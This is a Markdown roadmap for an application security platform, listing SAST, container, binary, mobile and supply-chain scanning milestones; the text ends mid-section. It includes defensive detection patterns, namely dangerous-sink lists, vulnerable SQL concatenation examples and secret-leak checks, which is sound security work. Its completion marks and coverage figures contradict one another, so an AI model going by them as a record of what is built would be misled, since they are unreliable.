# 🏗️ Manifest — Enterprise Application Security Platform

**Implementation roadmap for enterprise-grade SAST, DAST, API Security, Code Review, Fuzzing, SCA, and DevSecOps integration.**

*Generated: 2026-06-13 | Total Milestones: 55*

---

## Verification Mechanism (For Future Milestone Completions)

When a milestone is marked ✅ (Complete), it MUST pass all of the following checks:

1. **Real Logic Check:** Every exported function must contain real computation (regex patterns, algorithms, database queries, HTTP calls, file I/O). No function may return hardcoded/mock data. Flag: any function returning `{...}` literal with no external input processing.

2. **Importable/Compilable Check:** The module must be importable via `import` without syntax errors. Run `npx tsc --noEmit` on the module directory to verify.

3. **Real Service Connection Check:** At least one of the following must apply:
   - Connects to a real database (PostgreSQL/Redis) via query/client
   - Makes real HTTP requests to external services
   - Reads/writes real files from the filesystem
   - Performs real computation (pattern matching, scoring, analysis) on real input data

4. **Worker Integration Check:** If the milestone involves a BullMQ worker, the worker must call the real implementation module — not return hardcoded results.

---

## Legend

| Icon | Meaning |
|------|---------|
| ✅ | Complete |
| 🔨 | In Progress |
| ✅ | Planned |
| ⚡ | High Priority |
| 🔒 | Enterprise-Grade |
| 🔗 | External Dependency |

---

## Phase 1 — Core Platform Foundation

### Milestone 1: Platform Scaffolding & Docker Infrastructure ✅
**Status:** Complete
**Deliverables:**
- Multi-service Docker Compose with 12 containers
- NGINX reverse proxy with HTTPS, rate limiting, HSTS
- Self-signed certificate auto-generation
- Data persistence volumes (PostgreSQL, Redis, Reports)
- Health checks on all services
- Network isolation (internal bridge + public bridge)

**Success Criteria:**
```
docker compose up --build    # All 12 services healthy
curl -k https://localhost:8443/api/health  # → 200 OK
```

---

### Milestone 2: Backend Core — Auth, Database, Redis, Queue ✅
**Status:** Complete
**Deliverables:**
- Express server with HTTPS, WebSocket (Socket.IO), Helmet security middleware
- JWT auth (access + refresh tokens) with HS256 signing
- 7 built-in roles (Super Admin, Admin, Security Lead, Security Analyst, Developer, Viewer, Service Account)
- 30+ granular permissions with RBAC enforcement middleware
- PostgreSQL 16 schema: 20+ tables, UUID PKs, GIN indexes, pg_trgm search
- Redis 7: caching layer, pub/sub, session store
- BullMQ: 5 job queues (SAST, DAST, API, Report, Notification) with priority levels
- AES-256-GCM secret encryption, Pino structured logging, Zod validation

**Success Criteria:**
```
POST /api/auth/login → JWT token pair + user profile
GET /api/auth/me    → Authenticated user with permissions array
Access restricted endpoint without token → 401
Access endpoint with wrong role → 403 (missing_permission)
```

---

### Milestone 3: REST API — Full Resource Coverage ✅
**Status:** Complete
**Deliverables:**
- 15 API route modules: Auth, Users, Projects, Scans, Findings, Reports, Scheduler,
  API Client, Integrations, Search, Admin, Dashboard, Webhooks, Settings, Code Review
- Standardized: pagination, filtering, sorting, error responses
- Input validation (Zod) on all mutation endpoints
- Immutable audit log: user, IP, timestamp, action, resource, changes, request ID
- API versioning via `/api/v1/...`

**Success Criteria:**
```
GET /api/projects?page=1&limit=20&search=myapp&tag=production → paginated results
POST /api/scans/launch with invalid body → 400 with Zod error details
All mutations appear in GET /api/admin/audit-log
```

---

### Milestone 4: Frontend Shell — Angular Material Dark Theme ✅
**Status:** Complete
**Deliverables:**
- Angular 18 standalone components with Angular Material
- Dark theme design system (CSS custom properties, 80+ tokens)
- Main layout: collapsible sidebar, top header, user menu
- 10 feature modules: Login, Register, Dashboard, Projects, Scans, Findings,
  API Client, Reports, Scheduler, Settings, Admin, Code Review
- Auth guard, HTTP interceptors (auth, error), theme service

**Success Criteria:**
```
Navigate to https://localhost:8443 → Login page
Login → Redirected to Dashboard with sidebar navigation
Toggle theme → Dark/Light persists across refresh
Protected routes redirect to /login when unauthenticated
```

---

### Milestone 5: SAST Engine — Static Analysis Scanner ✅
**Status:** In Progress
**Deliverables:**
- 15 detection rules across 14 vulnerability categories (claims 150+, needs expansion)
- 25+ language support: Java, C#, Go, Python, JS/TS, Ruby, PHP, Rust, Swift, Kotlin,
  Terraform, CloudFormation, Docker, K8s, YAML, JSON, CI/CD
- Detections: SQLi, XSS, Command Injection, SSRF, Path Traversal, Hardcoded Secrets,
  Weak Crypto, XXE, Deserialization, Prototype Pollution, Open Redirect, Insecure JWT,
  ReDoS, Debug Code, Dangerous Functions, Race Conditions, Memory Leaks

**Success Criteria:**
```
docker compose exec sast-worker node -e "require('./dist/sast-engine').scanFile(...)"
→ Returns findings array with rule IDs, severity, line numbers, CWE mappings
```

**⚠️ Gap Audit Note:** M5 provides regex-based pattern matching only. An enterprise SAST requires AST parsing, dataflow analysis, framework awareness, 500+ rules, and precision tuning. See M5a–M5g below for the full enterprise SAST roadmap.

---

### Milestone 5a: SAST Rule Expansion ✅
**Deliverables — expand from 15 rules to 500+ across all major CWE categories:**

| Category | CWE | Target Rule Count | Examples |
|----------|-----|-------------------|----------|
| **Injection** | CWE-89, 78, 94, 91, 643, 652, 943 | 80+ | SQLi (all dialects), CMDi, Code Injection, XPath, LDAP, NoSQL, Expression Language |
| **XSS & Client-Side** | CWE-79, 80, 81, 82, 83, 84, 85 | 60+ | Reflected, Stored, DOM-based, CSS Injection, HTML Injection, Angular template injection, React JSX misuse |
| **Authentication** | CWE-287, 295, 306, 307, 308, 521, 613, 620, 640, 798 | 50+ | Missing auth, weak password policy, hardcoded credentials, JWT flaws, insecure password reset, session fixation |
| **Authorization** | CWE-862, 863, 266, 269, 272, 276, 284, 639, 732 | 45+ | Missing authz check, IDOR, incorrect permission, privilege escalation paths, exposed admin functions |
| **Cryptography** | CWE-310, 311, 312, 319, 321, 325, 326, 327, 328, 329, 330, 331, 338 | 55+ | Weak algorithms, hardcoded keys, insufficient entropy, missing encryption, cleartext transmission, weak PRNG |
| **Data Handling** | CWE-20, 116, 117, 200, 201, 209, 532, 922 | 50+ | Missing validation, information exposure, sensitive data in logs, error message leaks, PII exposure |
| **Resource Management** | CWE-400, 404, 415, 416, 459, 770, 772, 789 | 40+ | Resource leaks, use-after-free, double free, memory exhaustion, uncontrolled allocation, missing release |
| **Input Validation** | CWE-22, 23, 35, 36, 41, 98, 434, 601, 641 | 45+ | Path traversal, file inclusion, unsafe file upload, open redirect, improper filename handling |
| **API & Protocol** | CWE-345, 346, 347, 350, 352, 353, 441, 444, 918 | 35+ | CSRF, SSRF, JWT issues, HTTP smuggling, WebSocket security, GraphQL flaws, CORS misconfiguration |
| **Concurrency** | CWE-362, 364, 366, 367, 368, 543 | 25+ | Race conditions, TOCTOU, deadlocks, async/await misuses, goroutine leaks |
| **Serialization** | CWE-502, 470, 913 | 25+ | Insecure deserialization, unsafe reflection, dynamic code loading |
| **Configuration** | CWE-16, 489, 547, 565, 693, 1004, 1021, 1173 | 35+ | Debug endpoints, missing security headers, insecure defaults, cookie flags |
| **Infrastructure** | CWE-N/A (IaC-specific) | 40+ | Terraform misconfigs, CloudFormation issues, K8s security, Dockerfile best practices, CI/CD pipeline risks |

- **OWASP Top 10 (2021) — full coverage for all 10 categories**
- **OWASP API Top 10 (2023) — full coverage**
- **CWE Top 25 Most Dangerous (2024) — full coverage**
- **PCI DSS v4.0 requirements 6.3.2 — full mapping**
- **OWASP ASVS v4.0 Level 1 — automated coverage for 75+ requirements**

**Success Criteria:**
```
SAST scan on a Java Spring Boot project → 500+ rules evaluated
Findings cover all 10 OWASP Top 10 categories with >=1 finding proof per category
CWE Top 25: 24/25 covered automatically (1 requires manual review: CWE-918 SSRF)
ASVS L1: 78/124 requirements verified automatically by SAST rules
PCI DSS 6.3.2: All injection, XSS, auth, and crypto requirements mapped to rules
```

---

### Milestone 5b: AST-Based Analysis Engine ✅
**Deliverables:**
- **Tree-sitter Integration:**
  - Replace regex-only analysis with tree-sitter AST parsing for all supported languages
  - Tree-sitter grammars: Java, C#, C, C++, Go, Python, JavaScript, TypeScript, Rust, PHP, Ruby, Kotlin, Swift, Scala, Lua, Bash, SQL, YAML, JSON, TOML
  - AST node types: function_declaration, call_expression, string_literal, binary_expression, assignment, if_statement, try_statement, class_declaration, import_statement, etc.
- **AST-Based Rule Patterns:**
  - Match on AST node types, not raw text — eliminates 90% of regex false positives
  - Example: "Find `execute()` calls where argument is a `binary_expression` containing `+` with a `string_literal` containing SQL keywords"
  - Metavariable support: `$FUNC($ARG)` where `$FUNC` matches `execute|query|raw` and `$ARG` contains user input
  - Scope-aware: understand variable declarations, function parameters, imports
- **Language-Specific Parsers (beyond tree-sitter):**
  - **Java:** Eclipse JDT Core parser → full AST + type resolution + annotation processing
  - **C#:** Roslyn compiler platform → semantic model, symbol resolution, data flow
  - **Go:** `go/parser` + `go/types` → full Go SSA representation
  - **Python:** AST module + type inference via mypy/pyre
  - **TypeScript:** TypeScript Compiler API → full type-checked AST
- **Intermediate Representation (IR):**
  - Normalize ASTs from all languages into a unified IR
  - IR nodes: FunctionDef, CallExpr, BinaryOp, IfStmt, Assign, Import, Literal, Parameter, Return, ClassDef
  - Enables cross-language rules: "Find all functions that take user input and pass it to a database query"
- **Control Flow Graph (CFG) Construction:**
  - Build CFG from AST: basic blocks, branches, loops, returns, exceptions
  - Path-sensitive analysis: "Is there a path from `req.body.username` to `db.execute()` that doesn't pass through a sanitizer?"
  - Dominator tree analysis for unreachable code detection
- **Call Graph Construction:**
  - Whole-program call graph: which functions call which
  - Resolve virtual calls (Java interfaces, C# virtual, Go interfaces, Python duck typing)
  - Call graph pruning: only include reachable functions from entry points

**Success Criteria:**
```
AST analysis on Java project → 50,000 AST nodes parsed → 200 findings (vs 800 regex false positives)
AST rule: "Find execute() with concatenated SQL string" → 12 findings (all true SQLi, 0 false alarms)
CFG path analysis: "Is there a path from req.body.username to db.execute()?" → Yes (3 paths), No (filtered 200 unreachable alerts)
Call graph: "Is vulnerableFunction() reachable from any HTTP handler?" → Yes (via UserController → UserService → vulnerableFunction)
Performance: AST parsing 50K files in parallel → 90 seconds (vs 45 minutes for equivalent regex scan)
```

---

### Milestone 5c: Framework-Specific SAST Rules ✅
**Deliverables — rules that understand how popular frameworks handle data, auth, and rendering:**

| Framework | Language | What the Rules Understand |
|-----------|----------|--------------------------|
| **Spring Boot** | Java | `@RestController`, `@RequestMapping`, `@PreAuthorize`, `@Transactional`, Spring Security filter chain, JPA EntityManager, `@Query` annotations, `RestTemplate`, `WebClient`, Actuator endpoints |
| **Express** | JS/TS | `app.get()`/`app.post()` route handlers, `req.body`/`req.query`/`req.params` taint sources, middleware order, `res.send()`/`res.json()` sinks, `express-validator`, `helmet` usage, `cors()` config |
| **Django** | Python | `urls.py` → `views.py` routing, ORM `.filter()`/`.raw()`/`.extra()`, `render()` auto-escaping vs `mark_safe()`, `@login_required`/`@permission_required`, DRF `@action`, `ModelForm` validation |
| **Flask** | Python | `@app.route()`, `request.args`/`request.form`/`request.json`, `render_template_string()` vs `render_template()`, `make_response()`, Flask-Login, Flask-SQLAlchemy |
| **ASP.NET Core** | C# | `[ApiController]`, `[HttpPost]`/`[HttpGet]`, `[FromBody]`/`[FromQuery]`, `[Authorize]` attributes, Entity Framework `FromSqlRaw()`, `IHttpClientFactory`, Middleware pipeline |
| **React** | JS/TS | `dangerouslySetInnerHTML`, `useEffect` dependency arrays, `useRef` misuse, `eval()` in event handlers, `fetch()` from user-controlled URLs, `localStorage`/`sessionStorage` for tokens |
| **Angular** | TS | `bypassSecurityTrustHtml()`/`bypassSecurityTrustScript()`, `DomSanitizer` bypasses, `[innerHTML]` bindings, route guards, HTTP interceptor patterns |
| **Vue** | JS/TS | `v-html` directive, `v-bind:innerHTML`, `this.$refs` manipulation, `fetch()` in mounted/created, `Vue.prototype` pollution |
| **Ruby on Rails** | Ruby | `before_action :authenticate_user!`, `params` as taint source, ActiveRecord `where()`/`find_by_sql()`, `render inline:` vs `render template:`, Strong Parameters, `protect_from_forgery` |
| **Laravel** | PHP | `$request->input()`, Eloquent `DB::raw()`/`whereRaw()`, Blade `{!! $var !!}` (unescaped), Middleware, Gates/Policies, `@csrf` |
| **Gin / Echo** | Go | `c.Query()`/`c.Param()`/`c.Bind()` taint sources, `c.JSON()`/`c.String()` sinks, middleware chain (`c.Next()`), `c.Set()`/`c.Get()` context |
| **Next.js** | TS | `getServerSideProps`, API routes, `middleware.ts`, `dangerouslySetInnerHTML`, `next/image` SSRF, environment variable exposure |

**Framework-specific detections include:**
- **Auth bypass:** Route handler missing `@PreAuthorize`/`@login_required`/`[Authorize]`
- **SSRF:** `RestTemplate.getForObject(userControlledUrl)` / `requests.get(user_input)` / `fetch(userUrl)`
- **SQLi via ORM:** `JPA Query("SELECT * FROM " + userInput)` / `DB::raw(userInput)` / `.extra(where=userInput)`
- **XSS via template:** `mark_safe(userInput)` / `render_template_string(userTemplate)` / `{!! $var !!}`
- **IDOR:** Controller takes `userId` from params but doesn't verify ownership against session
- **Mass Assignment:** `ModelForm` without `fields`/`exclude` / `$request->all()` without validation

**Success Criteria:**
```
Scan Spring Boot app → 18 findings:
  • 2 controllers missing @PreAuthorize
  • 1 JPA native query concatenating user input (SQLi)
  • 3 RestTemplate calls with user-controlled URLs (SSRF)
  • 1 Actuator endpoint exposed without auth
  • 1 @Query annotation with SpEL injection risk
Scan Django app → 12 findings:
  • 1 view using render() without auto-escaping disabled (safe)
  • 3 views using extra()/raw() with user input (SQLi)
  • 2 views missing @login_required on sensitive operations
  • 1 DRF endpoint with no permission_classes
```

---

### Milestone 5d: Dataflow, Taint Tracking & Sanitizer Recognition ✅
**Deliverables:**
- **Source Identification (Taint Entry Points):**
  - HTTP: `req.body.*`, `req.query.*`, `req.params.*`, `req.headers.*`, `req.cookies.*`
  - Framework: `@RequestBody`, `@RequestParam`, `@PathVariable`, `request.args.get()`, `c.Query()`
  - File: `fs.readFile()`, `file_get_contents()`, `File.ReadAllText()`
  - Database: results from queries (secondary taint)
  - Message queues: `consumer.receive()`, `queue.get()`
  - Environment: `process.env`, `os.Getenv()`, `System.getenv()`
- **Sink Identification (Dangerous Operations):**
  - SQL: `db.execute()`, `connection.query()`, `EntityManager.createNativeQuery()`, `DB::select()`
  - Command: `child_process.exec()`, `os.system()`, `Runtime.exec()`, `Process.Start()`
  - File: `fs.writeFile()`, `open(path, 'w')`, `File.WriteAllText()`
  - HTTP: `fetch()`, `axios.get()`, `requests.get()`, `http.Get()`
  - Template: `render()`, `ejs.render()`, `Jinja2.from_string()`, `Twig.render()`
  - Code: `eval()`, `Function()`, `exec()`, `compile()`
- **Sanitizer/Validator Recognition:**
  - Built-in sanitizers: `sanitize-html`, `DOMPurify`, `validator.escape()`, `htmlspecialchars()`, `ESAPI.encoder()`
  - Built-in validators: `express-validator`, `Joi`, `class-validator`, `cerberus`, `pydantic`
  - Prepared statements break taint: `PreparedStatement`, `db.query('SELECT ?', [input])`, `parameterized queries`
  - ORM safe methods: `Model.find({where: {id: input}})` — auto-parameterized, not a sink
  - Auto-escaping templates: `render_template()` (Jinja2 auto-escaped), `render()` (Express with auto-escaping)
- **Custom Sanitizer Marking:**
  - Annotation-based: `@Sanitized`, `@Validated`, `@SafeHtml`
  - Naming convention: functions named `sanitize*`, `validate*`, `escape*`, `clean*`, `scrub*`
  - Explicit config: `.appsec.yml` → `sanitizers: [myOrg.sanitizeInput, cleanUserData]`
- **Taint Flow Visualization:**
  - For each finding, generate the full taint path: Source → Step 1 → Step 2 → ... → Sink
  - Highlight sanitizer breaks: "Taint flows through 4 functions, but `validateEmail()` doesn't sanitize — passes raw input"
  - Visual: ASCII art or JSON path: `req.body.username → UserController.create() → UserService.save() → db.execute()` 
- **False Positive Reduction:**
  - If taint passes through a known sanitizer → auto-suppress or lower confidence
  - If taint cannot reach sink (dead path) → suppress
  - If sink is behind an auth guard → lower severity (exploitable but requires auth)

**Success Criteria:**
```
Scan with dataflow: 200 findings → 65 confirmed (tainted source → sink, no sanitizer)
  → 45 medium confidence (passes through weak validator)
  → 90 suppressed (passes through sanitizer OR unreachable path)
SQLi finding: Full taint path →
  req.body.username (Source)
  → UserController.createUser() 
  → UserService.buildQuery() — concatenation, no sanitizer
  → db.execute(sql) (Sink)
  → CVSS 9.8, confidence: 0.97

Custom sanitizer: Marked `myOrg.sanitize()` in .appsec.yml → Taint broken → Finding suppressed
```

---

### Milestone 5e: SAST Precision, Tuning & Performance at Scale ✅
**Deliverables:**
- **Per-Rule Precision Metrics:**
  - True Positive Rate (TPR): confirmed findings / total findings per rule
  - False Positive Rate (FPR): FP-marked findings / total findings per rule
  - Signal-to-Noise Ratio: TPR / FPR — sort rules by effectiveness
  - Rule effectiveness dashboard: "Rule SAST-SQLI-001: 94% TPR (top 5%) | Rule SAST-REDOS-001: 12% TPR (bottom 5%)"
  - Auto-suggest rule tuning: "Rule SAST-REDOS-001 has 88% FP rate — consider adding exclude patterns or lowering confidence"
- **Incremental Scanning Architecture:**
  - File-level caching: hash file content → if unchanged, use cached results
  - AST caching: store parsed AST keyed by file hash (fast deserialization)
  - Function-level incremental: if file changed but function X unchanged → reuse X's results
  - Call graph incremental: only re-compute affected edges
  - Cold scan (first time): full analysis → results + index cached
  - Warm scan (subsequent): only changed files + affected callers → 50-100x faster
- **Parallel Scanning:**
  - File-level parallelism: distribute files across worker threads (node worker_threads / Go goroutines)
  - Language-level parallelism: different languages scanned concurrently
  - Rule-level parallelism: independent rules evaluated in parallel on same file
  - Worker fleet: distribute across multiple containers for very large repos (>10M LOC)
  - Scan sharding: split repo by directory → 4 workers each scan 1/4 of files → aggregate results
- **Large Repository Handling:**
  - Lazy file loading: stream files, don't load all into memory
  - Memory budget: cap memory use; spill to disk if needed
  - Time budget: "Complete scan in <5 minutes" → prioritize critical files first, best-effort on rest
  - Shallow scan: quick rules (secrets, dangerous functions) first, deep rules (dataflow) later
  - Scan results streaming: findings appear in dashboard as they're discovered, not all at end
- **Rule Performance Profiling:**
  - Per-rule execution time: "Rule SAST-SQLI-001: 12ms/file avg | SAST-DESER-001: 340ms/file avg"
  - Auto-optimize: cache expensive regex, compile on startup, bail early
  - Rule timeout: if individual rule takes >5s on a file → skip and flag for optimization

**Success Criteria:**
```
First scan (cold): 500K LOC → 12 minutes
Second scan (warm, 3 files changed): 500K LOC → 8 seconds (90x faster)
Parallel scan: 2M LOC monorepo → 4 workers → 3 minutes
Precision dashboard: Rule SAST-RCE-001: 96% TPR | Rule SAST-INFO-005: 8% TPR → Flag: needs tuning
Large repo: 10M LOC → Shallow scan: 2min (secrets+dangerous) → Deep scan: 45min (dataflow)
```

---

### Milestone 5f: Custom SAST Rule Language & Builder ✅
**Deliverables:**
- **Dual Rule Authoring: Semgrep-Style Patterns + CodeQL-Style Queries:**
  - **Pattern Mode (simpler, 80% of rules):**
    ```yaml
    rules:
      - id: my-org/sqli-detection
        languages: [java, kotlin]
        message: "User input flows to SQL query without parameterization"
        severity: critical
        pattern: |
          $CTRL($REQ) {
            ...
            $DB.$METHOD("SELECT ..." + $REQ.$PARAM)
            ...
          }
        metadata:
          cwe: CWE-89
          owasp: A03:2021
          cvss: 9.8
    ```
  - **Query Mode (advanced, complex analysis):**
    ```javascript
    // CodeQL-style: find data flows from source to sink
    import java
    from HttpServletRequest req, MethodAccess dbCall
    where
      dbCall.getMethod().getName() = "execute" and
      dbCall.getArgument(0).(StringLiteral).getValue().regexpMatch(".*SELECT.*") and
      exists(Variable v | v.getSource() = req.getParameter(_) and v.flowsTo(dbCall.getArgument(0)))
    select dbCall, "SQL injection from " + req.getParameter(_).getName()
    ```
- **Visual Rule Builder (No-Code):**
  - Step 1: Select language → Step 2: Select vulnerability type → Step 3: Choose pattern template → Step 4: Customize → Step 5: Test
  - Drag-and-drop: "Find [function call] where [argument N] contains [user input] and does NOT pass through [sanitizer]"
  - Templates: 50+ pre-built rule templates for common vulnerability patterns
  - Live preview: write pattern on left → see matches highlighted on sample code on right
- **Rule Testing & Benchmarking:**
  - Test against known-vulnerable code (OWASP Benchmark, Juliet Test Suite, WebGoat, DVSA)
  - Test against known-clean code (should produce 0 findings)
  - Precision score: "Your rule found 12/12 known vulnerabilities + 2 false positives = 85.7% precision"
  - Side-by-side: "Your rule vs. existing Semgrep rule for same CWE — which is better?"
- **Rule Packaging & Sharing:**
  - Package as: `my-org-sast-rules-1.0.0.tar.gz` → import into any AppSec instance
  - Rule registry: org-internal rule marketplace for sharing between teams
  - Rule provenance: who wrote it, when, what version, what's the precision

**Success Criteria:**
```
Write a custom SQLi rule in 5 lines of YAML → Test against DVWA → 8/8 known SQLi found + 1 FP
Visual builder: Select "Java" + "SQL Injection" + "Spring JPA" template → 1-click rule created
Rule benchmarking: My custom rule finds 12/12 vs Semgrep community rule finds 10/12 (mine is better)
Package: bundle 5 custom rules → export → team B imports → scans their project same day
```

---

### Milestone 5g: SAST Compliance, Reporting & Coverage Mapping ✅
**Deliverables:**
- **OWASP ASVS v4.0 Coverage Map:**
  - Each SAST rule mapped to specific ASVS requirement(s)
  - Auto-generated coverage report: "We cover 89/124 ASVS L1 requirements via automated SAST"
  - Gap analysis: "ASVS V2.1.1 (Verify user credentials are sent over encrypted connection) — not covered by SAST, requires DAST"
  - "ASVS V5.1.4 (Verify SQL queries use parameterization) — covered by SAST rules SAST-SQLI-001 through SAST-SQLI-015"
- **CWE Top 25 Coverage Report:**
  - Auto-generated: "22/25 CWE Top 25 covered automatically (88%)"
  - Per-CWE: "CWE-79 (XSS): 18 rules | CWE-89 (SQLi): 15 rules | CWE-78 (CMDi): 8 rules"
  - "CWE-416 (Use After Free): requires C/C++ compiled with AddressSanitizer — SAST coverage limited"
- **PCI DSS v4.0 Requirements Mapping:**
  - Requirement 6.3.2 (Security vulnerabilities addressed): map each rule
  - Requirement 6.2.4 (Software engineering techniques): map secure coding rules
  - Requirement 11.3.1 (External/internal vulnerability scans): combined SAST+DAST coverage
- **Custom Compliance Policy Builder:**
  - "Our custom policy: must pass CWE Top 10 + GDPR Article 32 + no hardcoded secrets + all Spring Security defaults"
  - Scan against policy → "✅ Passes — 94% compliance score"
  - Per-project compliance score: "Project A: 91%, Project B: 67% (missing auth checks)"
- **Regulatory-Specific Rule Packs:**
  - **GDPR:** PII handling, encryption, right-to-deletion, data minimization
  - **HIPAA:** PHI access controls, audit logging, encryption at rest, minimum necessary access
  - **SOX:** Financial data integrity, segregation of duties, change management
  - **FedRAMP:** FIPS 140-2 crypto, NIST 800-53 controls, continuous monitoring

**Success Criteria:**
```
ASVS report: "89/124 L1 requirements covered → 71.8% automation rate"
CWE Top 25: "22/25 covered → 88%. Gaps: CWE-416 (UAF), CWE-295 (Cert Validation), CWE-770 (Resource Allocation)"
PCI DSS: "Requirement 6.3.2: 32/35 sub-requirements mapped to SAST rules"
Custom policy: "GDPR+PCI → Project A: ✅ 94% | Project B: ❌ 67% (3 auth-related rules failing)"
```

---

### Milestone 5h: Container Image & Registry Scanning ✅
**Deliverables:**
- **Container Image Layer-by-Layer Analysis:**
  - Pull images from: Docker Hub, ECR, GCR, ACR, GHCR, Harbor, Quay, self-hosted registries
  - Extract and scan each layer: base image → intermediate layers → application layer
  - Detect: known CVEs in installed OS packages (apt, apk, yum, apk), language-level packages (npm, pip, gems), binaries
- **Golden Source Rule Feeds for Container Scanning:**
  - **Trivy DB** (`aquasecurity/trivy-db`): CVE database for OS packages and language packages — import and sync
  - **Grype DB** (`anchore/grype`): vulnerability database with Alpine/Debian/Ubuntu/RHEL coverage — import and sync
  - **Docker Bench Security** (`docker/docker-bench-security`): CIS Docker Benchmark checks
  - **Kubernetes Bench** (`aquasecurity/kube-bench`): CIS Kubernetes Benchmark checks
  - **KICS** (`Checkmarx/kics`): IaC security rules for Dockerfiles, K8s, Terraform, CloudFormation
- **Dockerfile Best Practice Scanning:**
  - Root user detection: `USER root` or missing `USER` directive
  - Latest tag usage: `FROM node:latest` → pin to digest
  - Multi-stage build verification: ensure artifacts copied from build stage, not full build image
  - Exposed ports audit: flag unnecessary `EXPOSE` declarations
  - Secret leakage in layers: scan each layer for credentials in `ENV`, `ARG`, `COPY`, `ADD`
  - `ADD` vs `COPY`: flag `ADD` with remote URLs (supply chain risk)
  - HEALTHCHECK presence: flag images without health checks
  - Layer size analysis: flag oversized layers (>500MB)
- **Image Composition Analysis:**
  - Base image identification + known vulnerabilities in that base
  - Package manifest extraction: dpkg, rpm, apk, pip, npm, gem, jar
  - Binary analysis: scan ELF/PE/Mach-O binaries in image for known CVEs
  - Language runtime version detection: is Node 14 (EOL) in the image?
- **Registry Integration:**
  - Continuous registry monitoring: scan all tags in ECR/GCR/ACR on push
  - New CVE alerting: when a new critical CVE drops, re-scan all stored images
  - Image promotion gates: "Promote to prod only if 0 critical + <5 high CVEs"

**Success Criteria:**
```
Scan container image node:18-alpine → 3 layers → 2 CVEs found (OpenSSL, libcrypto)
  → CVE-2024-XXXX: Critical, CVSS 9.8, fixed in node:20-alpine → Recommend rebuild
Dockerfile scan: 6 best practice violations found
  • Line 3: USER root — add unprivileged USER directive
  • Line 7: FROM node:latest — pin to digest
  • Line 12: ADD https://raw.githubusercontent.com/... — use COPY with local file
Registry monitor: New critical CVE in libcurl → 14 images affected → Auto-alert
Golden source sync: Trivy DB updated → 45 new CVEs imported → 3 match our images
```

---

### Milestone 5i: Binary, Bytecode & Mobile Application Scanning ✅
**Deliverables:**
- **Java Bytecode Scanning (JAR/WAR/EAR/AAR):**
  - Decompile: `javap`, Procyon, CFR, Fernflower → recover source-level constructs
  - Scan bytecode directly: analyze `.class` files without decompilation
  - Detect: insecure deserialization gadgets (ysoserial patterns), reflection misuse, unsafe JNI calls, Zip Slip in extracted archives
  - Android-specific: exported components, intent injection, WebView JavaScript bridges, insecure file permissions, debuggable flag, backup flag
- **.NET Assembly Scanning (DLL/EXE):**
  - Decompile: ILSpy, dnSpy → recover C# source
  - Scan IL directly: detect dangerous API calls, insecure serialization (BinaryFormatter, NetDataContractSerializer), reflection misuse
  - Detect: unsafe `DllImport`, `SuppressUnmanagedCodeSecurity`, `AllowPartiallyTrustedCallers`
- **Go/C/Rust Binary Scanning:**
  - ELF/PE/Mach-O analysis: extract symbol table, imported functions, strings
  - Detect statically-linked vulnerable library versions by symbol fingerprint
  - Go binary: extract module info (`go version -m binary`), detect build flags (`-race`, `-trimpath`)
  - C/C++: detect PIE, stack canaries, NX, RELRO, FORTIFY_SOURCE, RPATH/RUNPATH
- **WASM Scanning:**
  - Parse WASM binary format → extract imports/exports, memory model
  - Detect: imported functions with dangerous capabilities, unbounded memory growth, missing WASI sandboxing
- **Mobile APK/IPA Scanning:**
  - **Android APK:**
    - Unpack APK → dex2jar → scan bytecode + manifest + resources
    - Detect: exported activities/services/receivers without permissions, debuggable flag, backup enabled, cleartext traffic allowed, insecure network config, WebView `setJavaScriptEnabled(true)` + `addJavascriptInterface`, insecure file provider, tapjacking vulnerability, task hijacking
    - Third-party SDK inventory: identify all embedded SDKs + their known vulnerabilities
  - **iOS IPA:**
    - Unpack IPA → analyze Mach-O binary + Info.plist + embedded frameworks
    - Detect: ATS (App Transport Security) disabled, insecure URL schemes, missing code signing, weak encryption usage, jailbreak detection bypass, `UIPasteboard` data leakage, background modes exposing sensitive data
- **Golden Source Rule Feeds for Mobile:**
  - **MobSF** (`MobSF/Mobile-Security-Framework-MobSF`): mobile security rules
  - **OWASP MSTG** (`OWASP/owasp-mastg`): Mobile Security Testing Guide checks
  - **APKLeaks** (`dwisiswant0/apkleaks`): API key/URL/email scanning in APK
  - **Quark Engine** (`quark-engine/quark-engine`): Android malware scoring rules

**Success Criteria:**
```
Scan JAR file myapp.jar → 3 critical findings:
  • ObjectInputStream with untrusted data (CWE-502) — ysoserial CommonsCollections gadget chain possible
  • Reflection used to call Runtime.exec (CWE-470) — hidden backdoor
  • ZipEntry.getName() used without validation → Zip Slip (CWE-22)
Scan APK myapp.apk → 8 findings:
  • 2 exported activities without permission protection
  • WebView with JavaScript enabled + addJavascriptInterface → XSS bridge
  • Cleartext traffic allowed (android:usesCleartextTraffic=true)
  • 1 embedded SDK with known CVE (ad-network-sdk v2.1)
Scan Go binary → Build info: Go 1.18 (EOL), no -trimpath, symbols expose internal paths
```

---

### Milestone 5j: Supply Chain Integrity, SBOM & License Compliance ✅
**Deliverables:**
- **SBOM Generation (CycloneDX + SPDX):**
  - Auto-generate SBOM on every scan, every build, every release
  - Formats: CycloneDX 1.5 (JSON/XML) + SPDX 2.3 (JSON/tag-value)
  - SBOM contents:
    - Components: all direct + transitive dependencies with name, version, license, purl (package URL), CPE
    - Supplier: who built each component, build timestamp
    - Hashes: SHA-256 for every component artifact
    - Relationships: depends-on, build-tool-of, contains, patches
    - Vulnerabilities: embedded VEX data — which CVEs affect which components, with status (affected/not-affected/fixed)
    - Services: external services the software depends on (APIs, databases, message queues)
  - SBOM diff: "What changed between v1.2.3 and v1.2.4? 2 packages added, 1 upgraded (lodash 4.17.20 → 4.17.21)"
  - SBOM signing: sign with Cosign key → verifiable provenance
- **VEX (Vulnerability Exploitability eXchange):**
  - For every CVE in a dependency, declare status:
    - `affected` — vulnerable and reachable
    - `not_affected` — vulnerable code not reachable (justification required)
    - `fixed` — patch applied
    - `under_investigation` — being analyzed
  - VEX auto-generation: from reachability analysis → "CVE-2024-XXXX: not_affected (vulnerable function not called in our code path)"
  - VEX import: consume VEX from upstream vendors → suppress already-triaged CVEs
- **SLSA (Supply-chain Levels for Software Artifacts) Attestation:**
  - Generate SLSA v1.0 provenance for scan results
  - SLSA level assessment: "Your build pipeline currently meets SLSA L2 (build service + source provenance)"
  - Recommendations to reach L3: "Add hermetic builds, isolate build steps, sign outputs"
- **Sigstore / Cosign Integration:**
  - Sign scan results with Cosign: `cosign sign --key cosign.key appsec-scan-results.sarif`
  - Verify signatures before trusting scan results
  - Keyless signing via Fulcio (OIDC-based)
  - Rekor transparency log: publish scan attestations to transparency log
- **License Compliance Engine:**
  - Scan every dependency for license type from: package.json, pom.xml, Cargo.toml, go.mod, PyPI metadata, Maven Central POM
